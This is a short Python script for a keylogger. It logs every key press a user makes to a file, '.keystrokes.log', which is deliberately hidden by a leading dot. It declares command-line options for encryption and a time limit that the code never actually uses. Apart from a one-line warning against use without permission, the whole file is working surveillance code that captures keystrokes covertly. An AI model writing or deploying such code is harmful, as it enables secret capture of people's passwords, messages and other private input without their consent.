import keyboard
import argparse
import time

parser = argparse.ArgumentParser(
    prog="Python Keylogger",
    description="Captures and stores the key presses of a user.",
    epilog="Do not use without permission from the targeted user."
)

parser.add_argument("-k", "--key", help="used to encrypt/decrypt contents of .keystrokes.log")
parser.add_argument("-t", "--time", type=int, help="number of seconds the program with run for")
parser.add_argument("-f", "--format", action="store_true", help="prints each keypress on a new line in .keystrokes.log")

args = parser.parse_args()
key = args.key
seconds = args.time
f = args.format

# beginning . hides log file
log_file = ".keystrokes.log"

# w mode so log file is overwritten on run
open(log_file, "w").close()

def press_key(event):
    with open(log_file, "a") as file:
        if f:
            # Each key press on new line
            file.write("{}\n".format(event.name))
        else:
            # All key presses on same line
            file.write(event.name)

keyboard.on_press(press_key)

keyboard.wait()